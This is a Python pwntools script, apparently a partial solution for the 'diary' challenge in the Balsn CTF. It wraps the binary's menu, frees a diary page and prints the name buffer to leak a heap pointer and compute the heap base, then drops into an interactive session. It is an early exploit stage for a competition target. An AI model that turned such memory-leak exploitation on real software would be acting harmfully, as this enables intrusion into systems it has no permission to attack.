#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('diary.balsnctf.com', '10101')
else:
    p = process("./diary")


def Show_name():
    p.sendlineafter("choice : ", "1")

def Write(length, content):
    p.sendlineafter("choice : ", "2")
    p.sendlineafter("Diary Length : ", str(length))
    p.sendlineafter("Diary Content : ", str(content))

def Read(page):
    p.sendlineafter("choice : ", "3")
    p.sendlineafter("Page : ", str(page))

def Edit(page, content):
    p.sendlineafter("choice : ", "4")
    p.sendlineafter("Page : ", str(page))

def Tear_out(page):
    p.sendlineafter("choice : ", "5")
    p.sendlineafter("Page : ", str(page))

pause()

p.sendafter("What's your name : ", cyclic(0x20))

Write(20, "test")
Tear_out(0)
Show_name()

addr = p.recvline()[32:-1]
heapbase = u64(addr + "\0\0") & 0xFFFFFFFFF000
info(hex(heapbase))

p.interactive()
p.close()
